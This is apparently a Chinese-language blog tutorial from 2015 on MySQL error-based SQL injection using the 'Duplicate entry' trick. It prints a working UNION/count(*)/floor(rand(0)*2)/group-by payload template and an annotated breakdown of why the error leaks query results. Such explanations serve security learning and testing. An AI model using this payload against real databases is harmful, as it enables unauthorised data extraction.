---
title: MySQL注入-重复条目报错回显公式
date: 2015-04-16 02:56:56
tags:
- Pene
- SqlInjection
categories:
- 巫蛊
- SQL注入
---

网上对于DuplicateEntry报错回显注入公式一般是如下的形式
```SQL
1' and 1=2 union select 1 from (select count(*),concat(floor(rand(0)*2),(单值式爆破语句))a from information_schema.tables group by a)b#
```


注入后数据库最终执行的语句类似以下格式：
```SQL
SELECT ... 
FROM ... 
WHERE id= '1' and 1=2
UNION
SELECT 1
FROM (
    SELECT 
        COUNT(*),
        CONCAT(
            FLOOR(RAND(0)*2),
            ( 单值式注入语句 ) 
        )a  
    FROM information_schema.tables  
    GROUP BY a 
) b--
```

这个公式有3个要点

1. 构造布尔断路引发的并联查询，目的是断路掉前面的查询，把查询流程完全引导到并联查询（union）语句中离去。payload为：
a' and 1=2 union select 
2. 嵌套优先报错的from子查询：由于并联查询(union)要求前后的列数目一致，需要把先执行的子查询中的duplicate entry错误抢在union select的列数不一致错误之前触发。这样列数多少就无关紧要了——因为代码永远不会执行到那就提前报错了。攻击载荷结构为: uinon
select 1 from ( 会产生duplicate entry的子查询语句 )b -- 。这里MySQL要求派生表必须提供别名（"Every derived table must have its own alias"），否则报错 
3. 构造产生duplicate entry错误的查询。

为什么会产生Duplicate entry错误呢？ 

知乎上[路西法同学对Duplicate entry的产生原因](http://www.zhihu.com/question/21031129)分析非常清晰。根据MySQL手册，rand()不可以作为ORDER BY的条件字段， 同理也不可以为group by的。上面这个mysql的bug的主要问题是获取的值不确定又可重复。同时又要来操作结果。值得注意的是，如果没有重新刷一次结果（例子中用的是count(*)来统计结果），单纯以rand制造会重复的不确定数也是没有效果的，如去掉count(*),那么也不会报错 ，所以使用left(rand(),3)之类的也是可以的（会产生会重复不确定的数）
整理这段注入代码的构造思路如下：

```SQL
...
WHERE id= '1' and 1=2
UNION
SELECT 1
FROM (
    SELECT 
        COUNT(*),    ##刷新
        CONCAT(      ##制造具有随机名称的字段
            FLOOR(RAND(0)*2),    ##制造随机数
            ( 单值式注入语句 )   ##真正需要执行的SQL指令，必须是单值式SQL命令
        )a           ##为制造出来的随机字段创建别名
    FROM information_schema.tables  
    GROUP BY a       ##利用制造出来的随机字段分组
) b--                ##MySQL要求派生表必须提供别名
```


 

 